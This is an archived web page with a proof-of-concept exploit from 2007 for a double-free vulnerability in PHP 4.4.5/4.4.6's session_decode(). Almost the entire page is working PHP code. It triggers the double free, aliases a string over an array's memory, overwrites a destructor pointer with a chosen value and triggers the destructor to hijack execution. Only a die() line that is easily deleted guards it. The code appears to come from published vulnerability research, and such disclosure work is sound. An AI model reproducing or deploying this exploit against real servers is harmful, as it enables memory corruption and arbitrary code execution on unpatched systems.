<html><head><title>PHP 4.4.5 / 4.4.6 session_decode() Double Free Exploit PoC</title></head><pre>&lt;?php
  ////////////////////////////////////////////////////////////////////////
  //  _  _                _                     _       ___  _  _  ___  //
  // | || | __ _  _ _  __| | ___  _ _   ___  __| | ___ | _ \| || || _ \ //
  // | __ |/ _` || '_|/ _` |/ -_)| ' \ / -_)/ _` ||___||  _/| __ ||  _/ //
  // |_||_|\__,_||_|  \__,_|\___||_||_|\___|\__,_|     |_|  |_||_||_|   //
  //                                                                    //
  //         Proof of concept code from the Hardened-PHP Project        //
  //                   (C) Copyright 2007 Stefan Esser                  //
  //                                                                    //
  ////////////////////////////////////////////////////////////////////////
  //     PHP 4.4.5/4.4.6 session_decode() Double Free Vulnerability     //
  ////////////////////////////////////////////////////////////////////////

  // This is meant as a protection against remote file inclusion.
  die(&quot;REMOVE THIS LINE&quot;);

  ini_set(&quot;session.serialize_handler&quot;, &quot;php&quot;);
  session_start();

  $varname = str_repeat(&quot;D&quot;, 39);
  $$varname = &amp;$_SESSION;

  // Trigger the double free
  
  session_decode($varname.'|i:0;');
  $_________________x = &quot;AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJ&quot;;
  $_________________a = array(&quot;OneElement&quot;);

  // Now x and a point to the same memory. Therefore x can be used to modify a

  // Overwrite pointer to the destructor  
  $_________________x[8*4+0] = chr(0x55);
  $_________________x[8*4+1] = chr(0x66);
  $_________________x[8*4+2] = chr(0x77);
  $_________________x[8*4+3] = chr(0x88);
  
  // Trigger the destruction
  unset($_________________a);
?&gt;

# milw0rm.com [2007-03-27]</pre></html>